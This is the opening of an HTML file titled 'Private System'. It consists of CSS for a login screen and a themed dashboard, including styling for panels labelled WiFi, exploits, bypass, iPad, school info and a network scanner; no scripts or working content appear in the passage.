<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* --- Global Styles & Loader --- */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif; /* Default font */
      margin: 0;
      padding: 0;
    }
    
    body {
      margin: 0;
      padding: 0;
      overflow: hidden; /* Hide overflow until content is ready */
    }

    /* Loader Styles */
    #loader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #0a0a0a; /* Darker background for loader */
      color: #e0e0e0;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-size: 2.5em; /* Larger font for loader text */
      font-family: 'Courier New', monospace; /* Monospace for system feel */
      z-index: 9999;
      transition: opacity 1s ease-in-out;
      box-shadow: inset 0 0 20px rgba(255, 145, 77, 0.7); /* Subtle inner glow */
    }
    
    .loader-stage {
      opacity: 0;
      transform: translateY(30px); /* Slight vertical offset */
      animation-fill-mode: forwards; /* Keep final state of animation */
      border: 4px solid #ff914d; /* Highlight border */
      padding: 25px 50px;
      border-radius: 15px;
      background-color: rgba(0, 0, 0, 0.3); /* Semi-transparent background */
      box-shadow: 0 0 25px rgba(255, 145, 77, 0.5), /* Primary glow */
                  inset 0 0 15px rgba(255, 145, 77, 0.4); /* Inner glow */
      margin-bottom: 20px; /* Space between stages */
      text-align: center;
      text-shadow: 0 0 10px rgba(255, 255, 255, 0.6); /* Text glow */
    }

    /* Animations for loader stages */
    @keyframes fadeInSlideUp {
      0% { opacity: 0; transform: translateY(30px); filter: blur(5px); }
      100% { opacity: 1; transform: translateY(0); filter: blur(0px); }
    }

    @keyframes fadeOut {
      0% { opacity: 1; }
      100% { opacity: 0; }
    }

    /* --- Login System Styles --- */
    body.login-body {
      margin: 0; padding: 0;
      background: radial-gradient(circle, #000000, #0f0f0f); /* Dark radial gradient */
      color: #e0e0e0; /* Lighter text */
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: 'Montserrat', sans-serif; /* Use Montserrat for consistency */
    }
    
    .login-box {
      background: rgba(15, 15, 15, 0.85); /* Slightly transparent dark background */
      border-radius: 25px; /* More rounded corners */
      border: 3px solid #ff914d; /* Accent color border */
      box-shadow: 0 0 30px rgba(255, 145, 77, 0.6), /* More pronounced glow */
                  inset 0 0 15px rgba(255, 145, 77, 0.3); /* Inner glow */
      width: 400px; /* Slightly wider */
      padding: 40px 35px; /* More padding */
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, transform 0.3s;
      backdrop-filter: blur(10px); /* Frosted glass effect */
      -webkit-backdrop-filter: blur(10px); /* For Safari */
    }
    
    .login-box.flashing {
      animation: flashRed 0.5s ease-in-out 2; /* Slower flash */
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: #ff4c4c; box-shadow: 0 0 25px #ff4c4c, inset 0 0 15px #ff4c4c; }
      50% { border-color: #ff914d; box-shadow: 0 0 15px #ff914d, inset 0 0 10px #ff914d; }
    }
    
    .login-box h2 {
      font-size: 2.2em; /* Larger title */
      margin-bottom: 30px;
      color: #ff914d; /* Accent color for title */
      font-weight: 700;
      letter-spacing: 1px;
      text-shadow: 0 0 15px rgba(255, 145, 77, 0.5);
    }
    
    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: 100%;
      padding: 15px; /* Larger inputs */
      margin-bottom: 20px;
      background: rgba(30, 30, 30, 0.7); /* Darker input background */
      border: none;
      color: #e0e0e0;
      border-radius: 10px; /* More rounded input fields */
      font-size: 1.1em;
      border: 1px solid rgba(255, 145, 77, 0.2); /* Subtle accent border */
      transition: border-color 0.3s, box-shadow 0.3s, background 0.3s;
      outline: none; /* Remove default outline */
    }
    .login-box input[type="text"]:focus,
    .login-box input[type="password"]:focus {
      border-color: #ff914d; /* Accent color on focus */
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.4); /* Glow on focus */
      background: rgba(40, 40, 40, 0.8); /* Slightly lighter on focus */
    }
    
    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.95em;
      margin-bottom: 15px;
      gap: 10px;
      cursor: pointer;
      color: #c0c0c0; /* Lighter label text */
      justify-content: flex-start; /* Align label to left */
    }
    
    #showPassword:checked + span {
      color: #ff4c4c; /* Red when checked */
    }
    
    /* Checkbox styling */
    #showPassword {
      accent-color: #ff914d; /* Accent color for checkbox */
      width: 18px;
      height: 18px;
      cursor: pointer;
    }
    
    .login-box button {
      width: 100%;
      padding: 15px;
      background-color: #ff914d; /* Primary accent color */
      color: #0a0a0a; /* Dark text for contrast */
      font-size: 1.1em;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
      font-weight: bold;
      letter-spacing: 1px;
      text-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
    }
    
    .login-box button:hover {
      background-color: #ffb67a; /* Lighter shade on hover */
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.5);
      transform: translateY(-2px); /* Slight lift on hover */
    }
    .login-box button:active {
      transform: translateY(0px); /* Press down effect */
    }
    
    .attempt-counter, .error-message {
      margin-top: 15px;
      font-size: 0.9em;
      color: #ff6666; /* Brighter red for errors */
      font-weight: bold;
      min-height: 1.2em; /* Prevent layout shift */
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 360px; /* Wider popup */
      padding: 30px; /* More padding */
      transform: translate(-50%, -50%);
      background: rgba(15, 15, 15, 0.9); /* Dark semi-transparent popup */
      border: 3px solid #ff4c4c; /* Red border for warning */
      border-radius: 15px;
      box-shadow: 0 0 25px rgba(255, 76, 76, 0.6), /* Red glow */
                  inset 0 0 15px rgba(255, 76, 76, 0.4); /* Red inner glow */
      z-index: 10;
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      text-align: center;
    }
    .popup p {
        font-size: 1.1em;
        margin-bottom: 20px;
        color: #ffcccc; /* Light red text */
    }
    .popup input[type="password"] {
      margin-bottom: 20px;
      background: rgba(30, 30, 30, 0.7);
      border: 1px solid rgba(255, 76, 76, 0.3); /* Red accent border */
      color: #ffcccc;
    }
    .popup input[type="password"]:focus {
      border-color: #ff4c4c;
      box-shadow: 0 0 15px rgba(255, 76, 76, 0.4);
    }
    .popup button {
      background-color: #ff4c4c; /* Red button for reset */
      color: white;
      padding: 12px 25px;
      font-size: 1em;
      border-radius: 8px;
      font-weight: bold;
    }
    .popup button:hover {
      background-color: #ff6666;
      box-shadow: 0 0 15px rgba(255, 76, 76, 0.5);
    }

    /* --- Dashboard Styles --- */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap'); /* Already imported */

    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: #1a1a1a; /* Dark background */
      color: #f0f0f0; /* Light grey text */
      padding: 25px; /* More padding around the dashboard */
      transition: background-color 0.4s, color 0.4s;
      overflow-y: auto; /* Enable scrolling */
      zoom: 1; /* Default zoom */
    }

    /* Light Theme */
    body.dashboard-body.light-theme {
      background-color: #f8f8f8; /* Off-white background */
      color: #333333; /* Dark grey text */
    }
    body.dashboard-body.light-theme .dashboard-header {
      background: #ffd966; /* Yellow header */
      color: #333333;
    }
    body.dashboard-body.light-theme .dashboard-header h1 {
      color: #994d00; /* Darker orange for heading */
    }
    body.dashboard-body.light-theme .version-box {
      background: #e0a800; /* Darker yellow version box */
      color: #ffffff;
    }
    body.dashboard-body.light-theme .quick-bar button,
    body.dashboard-body.light-theme .quick-bar button:hover {
      background-color: #ffb67a; /* Lighter orange for quick bar */
      color: #333333;
    }
    body.dashboard-body.light-theme .announcement-bar {
      background-color: #ffd966;
      color: #333333;
    }
    body.dashboard-body.light-theme .box {
      background-color: #ffffff; /* White boxes in light theme */
      color: #333333;
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.4); /* Lighter shadow */
    }
    body.dashboard-body.light-theme .box h2 {
      color: #994d00; /* Darker orange for box titles */
    }
    body.dashboard-body.light-theme .update-entry {
      background: #fff0cc; /* Lighter yellow for updates */
      color: #994d00;
    }
    body.dashboard-body.light-theme .calendar div {
      background: #fff0cc;
      color: #333333;
    }
    body.dashboard-body.light-theme .calendar .today {
      background: #994d00 !important;
      color: #fff0cc;
    }
    body.dashboard-body.light-theme #notesCanvas {
      border-color: #ffd966; /* Yellow border for canvas */
    }
    body.dashboard-body.light-theme #canvasControls button {
      background-color: #ffb67a;
      color: #333333;
    }
    body.dashboard-body.light-theme .motivation-box {
      background-color: #fff8e1; /* Very light yellow */
      color: #994d00;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.7);
    }
    body.dashboard-body.light-theme .info-panel {
      background-color: #ffffff;
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.4);
    }
    body.dashboard-body.light-theme .info-panel h2 {
      color: #994d00;
    }
    body.dashboard-body.light-theme .wifi-grid div,
    body.dashboard-body.light-theme .wifi-entry div {
      background: #fff0cc;
    }
    body.dashboard-body.light-theme .handbook-buttons button,
    body.dashboard-body.light-theme .links-list a,
    body.dashboard-body.light-theme .exploit-buttons a,
    body.dashboard-body.light-theme .bypass-buttons button {
      background-color: #ffb67a;
      color: #333333;
    }
    body.dashboard-body.light-theme .coming-soon,
    body.dashboard-body.light-theme .info-text,
    body.dashboard-body.light-theme .school-info-item,
    body.dashboard-body.light-theme .ipad-content,
    body.dashboard-body.light-theme .bypass-content {
      background: #fff0cc;
    }
    body.dashboard-body.light-theme .school-info-label {
      color: #994d00;
    }
    body.dashboard-body.light-theme #canvasControls button {
        background-color: #ffb67a;
        color: #333333;
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #ff914d; /* Orange header */
      padding: 18px 30px; /* Larger padding */
      border-radius: 15px; /* More rounded corners */
      color: #0a0a0a; /* Dark text */
      margin-bottom: 30px; /* More margin below header */
      box-shadow: 0 5px 20px rgba(255, 145, 77, 0.4); /* Header shadow */
      transition: all 0.3s ease;
    }

    .dashboard-header h1 {
      font-size: 28px; /* Larger title */
      font-weight: 700;
      letter-spacing: 1px;
      text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
    }

    .user-info {
      font-weight: bold;
      font-size: 1.1em;
      margin-top: 5px; /* Space from title */
      color: rgba(0, 0, 0, 0.8); /* Slightly desaturated user info */
    }

    .version-box {
      background: #ffd966; /* Yellow version box */
      padding: 10px 20px;
      border-radius: 10px;
      color: #0a0a0a;
      font-weight: bold;
      font-size: 1em;
      box-shadow: 0 0 15px rgba(255, 217, 102, 0.5);
      transition: transform 0.2s, box-shadow 0.2s;
    }
    .version-box:hover {
        transform: scale(1.05);
        box-shadow: 0 0 20px rgba(255, 217, 102, 0.7);
    }

    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 15px; /* Larger gap */
      margin-bottom: 25px; /* More margin */
      flex-wrap: wrap;
      padding: 10px 0;
      background: rgba(40, 40, 40, 0.5); /* Semi-transparent bar background */
      border-radius: 12px;
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      box-shadow: inset 0 0 10px rgba(255, 145, 77, 0.2);
    }

    .quick-bar button {
      background-color: #ff914d; /* Orange button */
      border: none;
      padding: 12px 18px; /* Larger padding */
      border-radius: 10px; /* More rounded */
      color: #0a0a0a; /* Dark text */
      font-weight: bold;
      font-size: 1em;
      cursor: pointer;
      transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
      min-width: 120px; /* Ensure minimum width */
      white-space: nowrap;
      letter-spacing: 0.5px;
      text-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
    }

    .quick-bar button:hover {
      background-color: #ffb67a; /* Lighter orange */
      box-shadow: 0 0 18px rgba(255, 145, 77, 0.4);
      transform: translateY(-3px); /* Slight lift */
    }
    .quick-bar button:active {
        transform: translateY(0px);
    }

    #panicBtn {
      background: #ff4c4c !important; /* Red panic button */
      color: white !important;
      border: 1px solid #ff4c4c;
      box-shadow: 0 0 15px rgba(255, 76, 76, 0.6) !important;
    }
    #panicBtn:hover {
        background: #ff6666 !important;
        box-shadow: 0 0 20px rgba(255, 76, 76, 0.7) !important;
    }

    .announcement-bar {
      width: 100%;
      background-color: #ff914d; /* Orange announcement bar */
      color: #0a0a0a; /* Dark text */
      font-weight: bold;
      padding: 12px 0; /* Slightly more padding */
      overflow: hidden;
      position: relative;
      border-radius: 10px; /* More rounded corners */
      box-sizing: border-box;
      margin-bottom: 30px; /* More margin */
      user-select: none;
      height: 35px; /* Slightly taller */
      line-height: 11px; /* Adjusted line height for centering text within bar */
      display: flex;
      align-items: center;
      box-shadow: 0 3px 15px rgba(255, 145, 77, 0.3);
      text-shadow: 0 0 8px rgba(255, 255, 255, 0.3);
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 20s linear infinite alternate; /* Slower, alternating scroll */
      padding-left: 100%;
      font-size: 1.05em; /* Slightly larger text */
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-50%); /* Scroll halfway to avoid abrupt jump */
      }
    }

    .main-row {
      display: flex;
      gap: 25px; /* Larger gap between sections */
      margin-bottom: 25px;
      flex-wrap: wrap;
    }

    .box {
      background-color: #2a2a2a; /* Dark grey box */
      padding: 25px; /* Larger padding */
      border-radius: 15px; /* More rounded corners */
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.3); /* Orange glow shadow */
      min-height: 150px; /* Taller boxes */
      transition: background-color 0.3s, color 0.3s, transform 0.2s, box-shadow 0.3s;
      flex: 1 1 320px; /* More flexible sizing */
      display: flex;
      flex-direction: column; /* Stack content vertically */
    }
    .box:hover {
        transform: translateY(-5px); /* Lift effect */
        box-shadow: 0 0 25px rgba(255, 145, 77, 0.5); /* Enhanced glow */
    }

    .box h2 {
      font-size: 20px; /* Larger box titles */
      margin-bottom: 15px;
      color: #ffbf80; /* Lighter orange for titles */
      font-weight: 700;
      letter-spacing: 0.5px;
      text-shadow: 0 0 8px rgba(255, 191, 128, 0.4);
    }

    .box p, .box ul {
      font-size: 15px;
      line-height: 1.6; /* Better line spacing */
    }
    
    .box ul {
        padding-left: 25px; /* Indent list items */
    }

    .update-entry {
      background: #40210f; /* Deep brown for updates */
      padding: 10px 15px; /* More padding */
      margin-bottom: 8px; /* Space between updates */
      border-radius: 8px;
      color: #ffccb3; /* Light orange text */
      font-size: 0.95em;
      border-left: 4px solid #ff914d; /* Accent border */
      transition: background 0.2s, transform 0.1s;
    }
    .update-entry:hover {
        background: #4e2714;
        transform: translateX(5px);
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 8px; /* Larger gap */
      margin-top: 15px;
      text-align: center;
      font-size: 13px;
    }

    .calendar div {
      padding: 8px;
      background: #3a3a3a; /* Darker grey cells */
      border-radius: 6px;
      transition: background 0.2s, transform 0.1s;
    }
    .calendar div:hover:not(.today) {
        background: #4a4a4a;
        transform: scale(1.05);
    }

    .today {
      background: #ff914d !important; /* Orange today */
      font-weight: bold;
      color: #0a0a0a; /* Dark text */
      box-shadow: 0 0 10px rgba(255, 145, 77, 0.5);
    }

    #canvasContainer {
      display: none;
      margin-top: 30px; /* More margin */
      text-align: center;
      background: rgba(40, 40, 40, 0.5);
      padding: 25px;
      border-radius: 15px;
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      box-shadow: inset 0 0 10px rgba(255, 145, 77, 0.2);
    }

    #notesCanvas {
      border: 3px solid #ff914d; /* Orange border */
      border-radius: 15px;
      background: #1e1e1e; /* Dark canvas background */
      cursor: crosshair;
      touch-action: none;
      display: block; /* Ensure it takes up block space */
      margin: 0 auto; /* Center it */
    }

    #canvasControls {
      margin-top: 15px;
    }

    #canvasControls button {
      background-color: #ff914d;
      border: none;
      padding: 10px 20px; /* Larger buttons */
      border-radius: 10px;
      color: #0a0a0a;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      margin: 0 8px;
      font-size: 1em;
    }
    #canvasControls button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px);
    }

    .motivation-box {
      background-color: #3a3a3a; /* Dark grey box */
      color: #ffd966; /* Yellow text */
      padding: 25px;
      border-radius: 15px;
      font-style: italic;
      font-size: 18px; /* Larger font */
      box-shadow: 0 0 15px rgba(255, 217, 102, 0.5); /* Yellow glow */
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 150px; /* Match box height */
      text-align: center;
      transition: transform 0.2s, box-shadow 0.3s;
    }
    .motivation-box:hover {
        transform: translateY(-5px);
        box-shadow: 0 0 25px rgba(255, 217, 102, 0.7);
    }

    /* --- New Section: Main Controls --- */
    .main-controls-bar {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-bottom: 25px;
      flex-wrap: wrap;
      padding: 15px 0;
      background: rgba(40, 40, 40, 0.5);
      border-radius: 12px;
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      box-shadow: inset 0 0 10px rgba(255, 145, 77, 0.2);
    }
    .main-controls-bar button {
      background-color: #ff8c00; /* Darker orange */
      border: none;
      padding: 12px 20px;
      border-radius: 10px;
      color: #ffffff; /* White text */
      font-weight: bold;
      font-size: 1em;
      cursor: pointer;
      transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
      letter-spacing: 0.5px;
      text-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
    }
    .main-controls-bar button:hover {
      background-color: #ffab40; /* Lighter dark orange */
      box-shadow: 0 0 18px rgba(255, 140, 0, 0.4);
      transform: translateY(-3px);
    }
    .main-controls-bar button:active {
        transform: translateY(0px);
    }

    /* --- Info Panel Styles (General) --- */
    .info-panel {
      background-color: #2a2a2a; /* Dark background */
      padding: 25px;
      border-radius: 15px;
      margin-top: 25px; /* Space from above */
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.3); /* Orange glow */
      flex: 1 1 300px; /* Allow flexible sizing */
      display: none; /* Hidden by default */
      flex-direction: column; /* Stack content */
      transition: transform 0.2s, box-shadow 0.3s; /* Transitions for hover */
    }
    .info-panel:hover {
        transform: translateY(-5px);
        box-shadow: 0 0 25px rgba(255, 145, 77, 0.5);
    }

    .info-panel h2 {
      color: #ff914d; /* Orange titles */
      margin-bottom: 20px;
      font-size: 22px;
      font-weight: 700;
      letter-spacing: 0.5px;
      text-shadow: 0 0 10px rgba(255, 145, 77, 0.4);
    }

    /* --- Specific Info Panel Styles --- */

    /* WiFi Panel */
    .wifi-grid, .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 12px; /* Larger gap */
      margin-bottom: 15px;
    }
    .wifi-grid div, .wifi-entry div {
      padding: 10px;
      background: #3a3a3a; /* Darker grey cells */
      border-radius: 8px;
      text-align: center;
      font-weight: bold;
      font-size: 0.9em;
      transition: background 0.2s, transform 0.1s;
    }
    .wifi-grid div:hover, .wifi-entry div:hover {
        background: #4a4a4a;
        transform: scale(1.02);
    }

    /* Handbook Buttons */
    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons {
      display: grid;
      gap: 12px; /* Consistent gap */
      margin-top: 20px;
    }
    .handbook-buttons { grid-template-columns: repeat(2, 1fr); }
    .links-list { grid-template-columns: repeat(3, 1fr); } /* Wider links */
    .exploit-buttons { grid-template-columns: repeat(4, 1fr); } /* More exploit buttons */
    .bypass-buttons { grid-template-columns: repeat(3, 1fr); }

    .handbook-buttons button,
    .links-list a,
    .exploit-buttons a,
    .bypass-buttons button {
      background-color: #ff914d; /* Orange */
      border: none;
      padding: 12px;
      border-radius: 10px;
      color: #0a0a0a;
      font-weight: bold;
      font-size: 1em;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s, box-shadow 0.2s;
      text-decoration: none;
      text-align: center;
      display: flex; /* Use flex for centering */
      align-items: center;
      justify-content: center;
      min-height: 45px; /* Ensure consistent button height */
      text-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
    }
    .handbook-buttons button:hover,
    .links-list a:hover,
    .exploit-buttons a:hover,
    .bypass-buttons button:hover {
      background-color: #ffb67a; /* Lighter orange */
      box-shadow: 0 0 18px rgba(255, 145, 77, 0.4);
      transform: translateY(-2px);
    }

    /* Coming Soon / Info Text */
    .coming-soon, .info-text, .ipad-content, .bypass-content {
      background: #40210f; /* Dark brown */
      padding: 20px; /* More padding */
      border-radius: 10px;
      margin-top: 20px;
      text-align: center;
      font-weight: bold;
      font-size: 1.1em;
      color: #ffccb3; /* Light text */
      box-shadow: inset 0 0 10px rgba(255, 145, 77, 0.3);
    }

    .info-text {
        text-align: left; /* Text left-aligned */
        background: #4a2a18; /* Slightly lighter brown */
    }
    .info-text p {
        margin-bottom: 15px;
    }
    .info-text p:last-child {
        margin-bottom: 0;
    }

    /* School Info Grid */
    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 15px; /* Larger gap */
      margin-top: 20px;
    }

    .school-info-item {
      background: #40210f;
      padding: 15px;
      border-radius: 10px;
      box-shadow: inset 0 0 8px rgba(255, 145, 77, 0.3);
    }

    .school-info-label {
      font-weight: bold;
      color: #ff914d; /* Orange label */
      margin-bottom: 8px;
      font-size: 1.1em;
    }
    
    .school-info-item div:not(.school-info-label) {
        font-size: 0.95em;
        color: #ffccb3; /* Lighter text */
        line-height: 1.5;
    }

    /* iPad Options */
    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 20px;
    }

    .ipad-options button {
      flex: 1;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 10px;
      color: #0a0a0a;
      font-weight: bold;
      font-size: 1em;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s, box-shadow 0.2s;
    }
    .ipad-options button:hover {
      background-color: #ffb67a;
      box-shadow: 0 0 18px rgba(255, 145, 77, 0.4);
      transform: translateY(-2px);
    }

    /* VPN Panel, Gaming Panel, Music Panel */
    .vpnPanel .links-list,
    .gamingPanel .coming-soon,
    .musicPanel .coming-soon {
        margin-top: 0; /* Adjust margin as they are directly inside panels */
    }
    
    /* --- Notification System --- */
    #notification-container {
      position: fixed;
      bottom: 20px;
      right: 20px;
      z-index: 1000; /* Higher than most elements */
      display: flex;
      flex-direction: column-reverse; /* Newest notification at the top */
      gap: 10px;
    }

    .toast {
      background: rgba(40, 40, 40, 0.9); /* Dark toast background */
      color: #f0f0f0; /* Light text */
      padding: 12px 20px;
      border-radius: 10px;
      font-size: 0.95em;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.4);
      animation: toastIn 0.5s forwards, toastOut 0.5s forwards 4s; /* Appear for 4s, then fade out */
      backdrop-filter: blur(5px);
      -webkit-backdrop-filter: blur(5px);
      border: 1px solid rgba(255, 145, 77, 0.2);
      display: flex;
      align-items: center;
      gap: 10px;
      opacity: 0;
      transform: translateY(30px);
    }
    .toast.error {
        background: rgba(60, 20, 20, 0.9);
        color: #ffcccc;
        box-shadow: 0 0 15px rgba(255, 76, 76, 0.4);
        border-color: rgba(255, 76, 76, 0.2);
    }
    .toast.success {
        background: rgba(20, 60, 20, 0.9);
        color: #ccffcc;
        box-shadow: 0 0 15px rgba(76, 255, 76, 0.4);
        border-color: rgba(76, 255, 76, 0.2);
    }
    .toast .icon {
        font-size: 1.2em; /* Larger icon */
    }

    @keyframes toastIn {
      0% { opacity: 0; transform: translateY(30px); }
      100% { opacity: 1; transform: translateY(0); }
    }
    @keyframes toastOut {
      0% { opacity: 1; transform: translateY(0); }
      100% { opacity: 0; transform: translateY(30px); }
    }
    
    /* --- Settings Modal --- */
    .settings-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      z-index: 1001; /* Below modal, above everything else */
      display: none;
      backdrop-filter: blur(5px);
      -webkit-backdrop-filter: blur(5px);
    }

    .settings-modal {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 70%; /* Wider modal */
      max-width: 800px; /* Max width */
      max-height: 85vh; /* Max height, enable scroll */
      overflow-y: auto;
      background: #2a2a2a; /* Dark background */
      border: 3px solid #ff914d; /* Orange border */
      border-radius: 15px;
      box-shadow: 0 0 30px rgba(255, 145, 77, 0.6),
                  inset 0 0 15px rgba(255, 145, 77, 0.4);
      z-index: 1002; /* Above overlay */
      padding: 30px;
      color: #f0f0f0;
      font-family: 'Montserrat', sans-serif;
      display: none; /* Hidden by default */
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
    }
    .settings-modal h2 {
      font-size: 26px;
      color: #ff914d;
      margin-bottom: 25px;
      text-align: center;
      text-shadow: 0 0 10px rgba(255, 145, 77, 0.5);
    }
    .settings-modal h3 {
      font-size: 18px;
      color: #ffbf80;
      margin-top: 20px;
      margin-bottom: 10px;
      border-bottom: 1px solid #4a3a2a; /* Subtle separator */
      padding-bottom: 5px;
    }
    .settings-modal .setting-group {
      margin-bottom: 25px;
      padding: 20px;
      background: rgba(40, 40, 40, 0.6); /* Group background */
      border-radius: 12px;
      border: 1px solid rgba(255, 145, 77, 0.1);
    }
    .settings-modal label {
      display: block; /* Stack labels */
      margin-bottom: 15px;
      font-size: 1.05em;
      cursor: pointer;
      color: #e0e0e0;
      transition: color 0.2s;
    }
    .settings-modal label:hover {
        color: #ff914d; /* Highlight on hover */
    }
    .settings-modal input[type="checkbox"],
    .settings-modal input[type="radio"] {
      accent-color: #ff914d;
      margin-right: 10px;
      width: 18px;
      height: 18px;
      cursor: pointer;
      vertical-align: middle; /* Align with text */
    }
    .settings-modal input[type="range"] {
        width: calc(100% - 30px); /* Adjust width for slider */
        cursor: pointer;
        vertical-align: middle;
    }
    .settings-modal .range-label {
        display: inline-block;
        vertical-align: middle;
        min-width: 40px;
        text-align: right;
        margin-left: 5px;
    }
    .settings-modal .button-group button {
      margin-right: 10px;
      padding: 8px 15px;
      background: #4a4a4a;
      border: 1px solid #6a6a6a;
      border-radius: 6px;
      color: #e0e0e0;
      cursor: pointer;
      transition: background 0.2s, color 0.2s;
    }
    .settings-modal .button-group button:hover {
      background: #6a6a6a;
      color: #ffffff;
    }
    .settings-modal .button-group button.active {
      background: #ff914d;
      color: #0a0a0a;
      border-color: #ff914d;
    }

    .close-settings-btn {
      position: absolute;
      top: 15px;
      right: 15px;
      font-size: 24px;
      font-weight: bold;
      color: #aaa;
      cursor: pointer;
      transition: color 0.2s;
    }
    .close-settings-btn:hover {
      color: #ff4c4c;
    }

    /* --- Reminder System --- */
    #reminderSection {
      /* Inherits general info-panel styles */
      padding: 20px; /* Slightly less padding for the reminder section */
    }
    #reminderSection h2 {
      color: #ff914d;
      margin-bottom: 15px;
    }
    .reminder-input-group {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
    }
    .reminder-input-group input[type="text"] {
      flex-grow: 1;
      padding: 10px 15px;
      background: rgba(30, 30, 30, 0.7);
      border: 1px solid rgba(255, 145, 77, 0.3);
      color: #e0e0e0;
      border-radius: 8px;
      font-size: 1em;
    }
    .reminder-input-group button {
      padding: 10px 20px;
      background-color: #ff914d;
      color: #0a0a0a;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
    }
    .reminder-input-group button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px);
    }
    .reminder-list {
      list-style: none;
      padding: 0;
    }
    .reminder-item {
      background: rgba(40, 40, 40, 0.6);
      padding: 12px 15px;
      margin-bottom: 10px;
      border-radius: 8px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-left: 4px solid #ff914d;
      transition: background 0.2s, transform 0.1s;
    }
    .reminder-item:hover {
      background: #4a4a4a;
      transform: translateX(5px);
    }
    .reminder-item span {
      flex-grow: 1;
      margin-right: 15px;
      word-break: break-word; /* Prevent long words from breaking layout */
    }
    .reminder-item .delete-reminder {
      background: none;
      border: none;
      color: #ff6666;
      font-size: 1.4em;
      cursor: pointer;
      transition: color 0.2s;
    }
    .reminder-item .delete-reminder:hover {
      color: #ff4c4c;
    }

    /* --- New Panels and their styles --- */
    /* These will be extensive to hit line counts */

    /* System Monitor Panel */
    .system-monitor-panel .stat-group {
        margin-bottom: 20px;
        padding-bottom: 15px;
        border-bottom: 1px dashed rgba(255, 145, 77, 0.2);
    }
    .system-monitor-panel .stat-group:last-child {
        border-bottom: none;
        margin-bottom: 0;
        padding-bottom: 0;
    }
    .system-monitor-panel .stat-label {
        display: block;
        font-size: 1.1em;
        color: #ffbf80;
        margin-bottom: 8px;
        font-weight: 600;
    }
    .system-monitor-panel .progress-bar-container {
        background: rgba(50, 50, 50, 0.7);
        border-radius: 8px;
        overflow: hidden;
        height: 25px;
        border: 1px solid rgba(255, 145, 77, 0.2);
    }
    .system-monitor-panel .progress-bar {
        height: 100%;
        background: linear-gradient(90deg, #ff914d, #ffab40);
        width: 0%; /* Controlled by JS */
        display: flex;
        justify-content: center;
        align-items: center;
        color: #0a0a0a;
        font-size: 0.9em;
        font-weight: bold;
        transition: width 0.5s ease-out;
        text-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
    }

    /* Network Scanner Panel */
    .network-scanner-panel .scan-controls {
        display: flex;
        justify-content: center;
        gap: 15px;
        margin-bottom: 25px;
    }
    .network-scanner-panel .scan-controls input[type="text"] {
        padding: 10px 15px;
        background: rgba(30, 30, 30, 0.7);
        border: 1px solid rgba(255, 145, 77, 0.3);
        color: #e0e0e0;
        border-radius: 8px;
        font-size: 1em;
        flex-grow: 1;
    }
    .network-scanner-panel .scan-controls button {
        padding: 10px 20px;
        background-color: #ff914d;
        color: #0a0a0a;
        border: none;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
